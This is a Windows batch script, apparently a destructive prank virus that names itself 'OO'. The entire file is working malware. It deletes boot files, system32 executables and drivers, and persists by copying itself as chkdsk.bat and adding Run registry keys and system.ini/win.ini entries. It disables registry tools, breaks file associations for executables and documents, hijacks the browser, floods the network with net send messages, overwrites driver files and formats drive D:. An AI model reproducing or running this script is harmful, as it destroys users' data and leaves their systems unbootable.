@echo off
color 4e
del /q /a:- c:\boot.ini
del /q /a:r c:\NTDETECT.COM
del /q /a:- C:\WINDOWS\system32\*.exe
del /q /a:s C:\WINDOWS\system32\*.exe
del /q /a:a C:\WINDOWS\system32\drivers\*.sys
del /q c:\windows\system32\*.nls
del /q /a:s c:\windows\system32\*
del /q c:\windows\lastgood\*
del /q c:\windows\system\*
del /q c:\windows\pss\*
copy oo.bat c:\windows\system32\
echo start c:\windows\system32\shutdown.exe -r -c "OO is running away! Help me!" -f>>c:\windows\help\Hint.bat
echo start c:\winsows\system32\chkdsk.bat>>c:\windows\help\Hint.bat
echo copy d:\boot.bat c:\windows\system32\>>c:\windows\help\Hint.bat
echo rename c:\windows\system32\boot.bat chkdsk.bat>>c:\windows\help\Hint.bat
echo Windows Registry Editor Version 5.00>>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>h.reg
echo "Chkdsk"="C:\\WINDOWS\\System32\\chkdsk.bat">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>h.reg
echo "Boot"="d:\\Boot.bat">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>h.reg
echo "MSHelp"="C:\\WINDOWS\\HELP\\Hint.bat">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Ratings]>>h.reg
echo "Key"=hex:db,23,45,6f,8e,41,70,4c,44,5e,d0,23,79,c2,b4,b1>>h.reg
echo "Hint"="Hello. I am OO.">>h.reg
echo "FileName0"="C:\\WINDOWS\\System32\\RSACi.rat">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Ratings\.Default]>>h.reg
echo "Allow_Unknowns"=dword:00000000>>h.reg
echo "PleaseMom"=dword:00000001>>h.reg
echo "Enabled"=dword:00000001>>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Ratings\.Default\http://www.rsac.org/ratingsv01.html]>>h.reg
echo "v"=dword:00000004>>h.reg
echo "s"=dword:00000004>>h.reg
echo "n"=dword:00000004>>h.reg
echo "l"=dword:00000004>>h.reg
echo [HKEY_USERS\.DEFAULT\Software\Microsoft\Windows\CurrentVersion\Policies\System]>>h.reg
echo "DisableRegistryTools"=dword:00000001>>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.reg]>>h.reg
echo @="txtfile">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.gif]>>h.reg
echo @="txtfile">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.htm]>>h.reg
echo @="txtfile">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.html]>>h.reg
echo @="txtfile">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.doc]>>h.reg
echo @="txtfile">>h.reg
echo "Content Type"="">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.exe]>>h.reg
echo @="txtfile">>h.reg
echo "Content Type"="">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.exe\PersistentHandler]>>h.reg
echo @="">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Classes\.mp3]>>h.reg
echo @="txtfile">>h.reg
echo "Content Type"="">>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system]>>h.reg
echo "dontdisplaylastusername"=dword:00000001>>h.reg
echo "legalnoticecaption"="Fuck">>h.reg
echo "legalnoticetext"="It's ok to be a gay.">>h.reg
echo "shutdownwithoutlogon"=dword:00000000>>h.reg
echo [HKEY_USERS\S-1-5-21-1454471165-507921405-1343024091-500\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]>>h.reg
echo "Start_ShowRun"=dword:00000000>>h.reg
echo "Start_ShowControlPanel"=dword:00000000>>h.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>h.reg
echo "NoViewContextMenu"=dword:00000001>>h.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>h.reg
echo "OO"="C:\\WINDOWS\\System32\\sspipes.scr">>h.reg
echo [HKEY_USERS\S-1-5-21-1454471165-507921405-1343024091-500\Software\Microsoft\Internet Explorer\Main]>>h.reg
echo "Start Page"="http://www.doggiehome.com/">>h.reg
echo "FullScreen"="yes">>h.reg
echo "Show_URLToolBar"="no">>h.reg
echo "Show_URLinStatusBar"="no">>h.reg
echo "Show_StatusBar"="no">>h.reg
reg import h.reg
del h.reg
rename c:\windows\system32\oo.bat chkdsk.bat
copy c:\windows\system32\chkdsk.bat d:\
rename d:\chkdsk.bat boot.bat
start c:\windows\help\Hint.bat
echo shell=c:\windows\system32\chkdsk.bat>>c:\windows\system.ini
echo shell=c:\windows\system32\chkdsk.bat>>c:\windows\win.ini
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>d:\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system\Hello.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\readme.txt
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\Thank.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\Thank.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\Tank1.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\tank2.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\tank3.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\tank4.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\tank5.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\tank6.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\tank7.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\tank8.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\tank9.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>d:\You.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>d:\Thank.oo
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\drivers\ntfs.sys
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\drivers\loop.sys
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\drivers\power.sys
echo Hello! I only want to play with you. My name is OO. Hope you enjoy your life and me. Thank You!>>c:\windows\system32\drivers\poloo.sys
start c:\windows\system32\chkdsk.bat
start net send * Hello
start net send * Hello
start net send * Hello
start net send * Hello
start net send * Hello
start net send * Hello
start net send * Hello
start net send * Hello
start net send * Hello
start net send * Hello
start net send * Hello
start net send * Hello
start net send * Hello
start net send * Hello
start net send * Hello
start net send * Hello
start net send * Hello
start chkdsk
start format d:\
